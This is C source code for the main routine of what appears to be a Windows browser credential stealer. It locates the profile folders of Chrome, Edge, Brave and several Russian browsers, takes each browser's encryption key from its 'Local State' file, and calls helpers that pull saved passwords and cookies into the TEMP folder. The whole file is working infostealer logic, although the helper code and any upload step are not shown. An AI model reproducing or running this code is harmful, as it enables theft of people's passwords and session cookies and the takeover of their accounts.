#include <stdio.h>
#include <stdlib.h>
#include <io.h>

#include "../include/vaultkey.h"
#include "../include/browser.h"
#include "../include/_strcat.h"


int main(void) {
    char *AppData = getenv("LOCALAPPDATA");
	char *TempFolder = getenv("TEMP");
    char *paths[] = {
        "\\Amigo\\User Data",
        "\\Sputnik\\Sputnik\\User Data",
        "\\Google\\Chrome\\User Data",
        "\\Microsoft\\Edge\\User Data",
        "\\Kometa\\User Data",
		"\\BraveSoftware\\Brave-Browser\\User Data"
    };
	int BrowsersList = sizeof(paths) / sizeof(paths[0]);

	for (int i = 0; i < BrowsersList; i++) {
		char *BrowserPath = _strcat(AppData, paths[i]);
		if (_access(BrowserPath, 0) == 0) {
			char *LocalStatePath = _strcat(BrowserPath, "\\Local State");
			unsigned char *DecryKey = GetVaultKey(LocalStatePath);
			if (DecryKey == NULL) {
				printf("[ERR] => An error has accord while getting vault's key\n");
				free(LocalStatePath);
				return 1;
			}
			free(LocalStatePath);

			char *LoginDataPath = _strcat(BrowserPath, "\\Default\\Login Data");
			if (GetPwdData(DecryKey, LoginDataPath, TempFolder) != 0) {
				printf("[ERR] => An error has accord while getting passwords\n");
				free(LoginDataPath);
				return 1;
			}
			free(LoginDataPath);

			char *CookiesDataPath = _strcat(BrowserPath, "\\Default\\Network\\Cookies");
			if (GetCookieData(DecryKey, CookiesDataPath, TempFolder) != 0) {
				printf("[ERR] => An error has accord while getting cookies\n");
				free(CookiesDataPath);
				return 1;
			}
			free(CookiesDataPath);
		}
		free(BrowserPath);
	}
	return 0;
}
